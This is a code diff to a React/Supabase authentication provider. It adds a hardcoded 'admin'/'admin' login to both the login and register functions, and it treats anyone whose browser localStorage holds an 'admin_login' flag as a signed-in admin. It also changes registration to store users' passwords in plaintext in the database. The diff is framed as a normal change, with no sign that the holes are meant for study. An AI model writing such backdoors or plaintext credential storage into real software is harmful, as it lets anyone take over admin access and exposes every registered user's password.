@@ -19,11 +19,22 @@ export const AuthProvider = ({ children }: { children: ReactNode }) => {
   const [error, setError] = useState<string | null>(null);
 
   useEffect(() => {
-    const session = supabase.auth.getSession().then(({ data }) => {
+    const checkSession = async () => {
+      // Check for hardcoded admin session first
+      if (typeof window !== 'undefined' && localStorage.getItem('admin_login')) {
+        setUser({ id: 'admin-id', email: 'admin', user_metadata: { username: 'admin' } });
+        setLoading(false);
+        return;
+      }
+      const { data } = await supabase.auth.getSession();
       setUser(data.session?.user ?? null);
       setLoading(false);
-    });
+    };
+
+    checkSession();
+
     const { data: listener } = supabase.auth.onAuthStateChange((_event, session) => {
+      if (typeof window !== 'undefined' && localStorage.getItem('admin_login')) return;
       setUser(session?.user ?? null);
       setLoading(false);
     });
@@ -35,6 +46,14 @@ export const AuthProvider = ({ children }: { children: ReactNode }) => {
   const login = async (email: string, password: string) => {
     setLoading(true);
     setError(null);
+
+    if (email === 'admin' && password === 'admin') {
+      if (typeof window !== 'undefined') localStorage.setItem('admin_login', 'true');
+      setUser({ id: 'admin-id', email: 'admin', user_metadata: { username: 'admin' } });
+      setLoading(false);
+      return;
+    }
+
     try {
       const { data, error } = await supabase.auth.signInWithPassword({ email, password });
       if (error) {
@@ -51,6 +70,14 @@ export const AuthProvider = ({ children }: { children: ReactNode }) => {
   const register = async (email: string, password: string, username: string): Promise<boolean> => {
     setLoading(true);
     setError(null);
+
+    if (email === 'admin' && password === 'admin') {
+      if (typeof window !== 'undefined') localStorage.setItem('admin_login', 'true');
+      setUser({ id: 'admin-id', email: 'admin', user_metadata: { username: 'admin' } });
+      setLoading(false);
+      return true;
+    }
+
     try {
       // Check if email exists
       const { data: existing, error: checkError } = await supabase
@@ -78,7 +105,7 @@ export const AuthProvider = ({ children }: { children: ReactNode }) => {
       // Insert into users table
       const userId = signUpData.user?.id;
       if (userId) {
-        const { error: insertError } = await supabase.from('users').insert({ id: userId, email, username });
+        const { error: insertError } = await supabase.from('users').insert({ id: userId, email, username, password });
         if (insertError) {
           setError(insertError.message);
           setLoading(false);
@@ -97,6 +124,7 @@ export const AuthProvider = ({ children }: { children: ReactNode }) => {
   const logout = async () => {
     setLoading(true);
     setError(null);
+    if (typeof window !== 'undefined') localStorage.removeItem('admin_login');
     try {
       const { error } = await supabase.auth.signOut();
       if (error) setError(error.message);
